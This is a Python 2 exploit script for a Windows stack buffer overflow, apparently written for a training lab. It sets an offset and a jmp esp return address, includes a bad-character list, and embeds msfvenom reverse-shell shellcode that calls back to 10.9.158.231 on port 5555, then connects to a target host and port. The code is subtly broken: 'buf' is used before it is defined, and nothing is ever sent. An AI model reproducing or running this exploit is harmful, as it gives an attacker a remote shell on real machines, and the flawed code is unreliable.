#!/usr/bin/env python2

import socket
import sys
import logging


offset=2026

bad_chars="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# address of jmp esp
jmp_esp="\x05\x12\x50\x62"

# NOP
nop="\x90"*20

# shellcode created with
# msfvenom -p windows/shell_reverse_tcp  LHOST=10.9.158.231 LPORT=5555 -f python  -b '\x00\xa9\xcd\xd4' -v shellcode
shellcode =  b""
shellcode += b"\xba\x24\xce\xd2\x32\xda\xc5\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x52\x31\x50\x12\x03\x50\x12"
shellcode += b"\x83\xcc\x32\x30\xc7\xf0\x23\x37\x28\x08\xb4"
shellcode += b"\x58\xa0\xed\x85\x58\xd6\x66\xb5\x68\x9c\x2a"
shellcode += b"\x3a\x02\xf0\xde\xc9\x66\xdd\xd1\x7a\xcc\x3b"
shellcode += b"\xdc\x7b\x7d\x7f\x7f\xf8\x7c\xac\x5f\xc1\x4e"
shellcode += b"\xa1\x9e\x06\xb2\x48\xf2\xdf\xb8\xff\xe2\x54"
shellcode += b"\xf4\xc3\x89\x27\x18\x44\x6e\xff\x1b\x65\x21"
shellcode += b"\x8b\x45\xa5\xc0\x58\xfe\xec\xda\xbd\x3b\xa6"
shellcode += b"\x51\x75\xb7\x39\xb3\x47\x38\x95\xfa\x67\xcb"
shellcode += b"\xe7\x3b\x4f\x34\x92\x35\xb3\xc9\xa5\x82\xc9"
shellcode += b"\x15\x23\x10\x69\xdd\x93\xfc\x8b\x32\x45\x77"
shellcode += b"\x87\xff\x01\xdf\x84\xfe\xc6\x54\xb0\x8b\xe8"
shellcode += b"\xba\x30\xcf\xce\x1e\x18\x8b\x6f\x07\xc4\x7a"
shellcode += b"\x8f\x57\xa7\x23\x35\x1c\x4a\x37\x44\x7f\x03"
shellcode += b"\xf4\x65\x7f\xd3\x92\xfe\x0c\xe1\x3d\x55\x9a"
shellcode += b"\x49\xb5\x73\x5d\xad\xec\xc4\xf1\x50\x0f\x35"
shellcode += b"\xd8\x96\x5b\x65\x72\x3e\xe4\xee\x82\xbf\x31"
shellcode += b"\xa0\xd2\x6f\xea\x01\x82\xcf\x5a\xea\xc8\xdf"
shellcode += b"\x85\x0a\xf3\x35\xae\xa1\x0e\xde\xdb\x3c\x8e"
shellcode += b"\xf9\xb4\x3c\xae\x10\xf6\xc8\x48\x70\xe8\x9c"
shellcode += b"\xc3\xed\x91\x84\x9f\x8c\x5e\x13\xda\x8f\xd5"
shellcode += b"\x90\x1b\x41\x1e\xdc\x0f\x36\xee\xab\x6d\x91"
shellcode += b"\xf1\x01\x19\x7d\x63\xce\xd9\x08\x98\x59\x8e"
shellcode += b"\x5d\x6e\x90\x5a\x70\xc9\x0a\x78\x89\x8f\x75"
shellcode += b"\x38\x56\x6c\x7b\xc1\x1b\xc8\x5f\xd1\xe5\xd1"
shellcode += b"\xdb\x85\xb9\x87\xb5\x73\x7c\x7e\x74\x2d\xd6"
shellcode += b"\x2d\xde\xb9\xaf\x1d\xe1\xbf\xaf\x4b\x97\x5f"
shellcode += b"\x01\x22\xee\x60\xae\xa2\xe6\x19\xd2\x52\x08"
shellcode += b"\xf0\x56\x62\x43\x58\xfe\xeb\x0a\x09\x42\x76"
shellcode += b"\xad\xe4\x81\x8f\x2e\x0c\x7a\x74\x2e\x65\x7f"
shellcode += b"\x30\xe8\x96\x0d\x29\x9d\x98\xa2\x4a\xb4"

# Now compose the payload

# badchars finding (optional) + reduced junk 
#buf+=bad_chars + "A"*(offset-len(bad_chars))

# Otherwise fill the buffer with junk until reaching the overflow
buf+="A"*offset

buf += jmp_esp
buf += nop
buf += shellcode
# Finally linefeed to send the buffer
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)
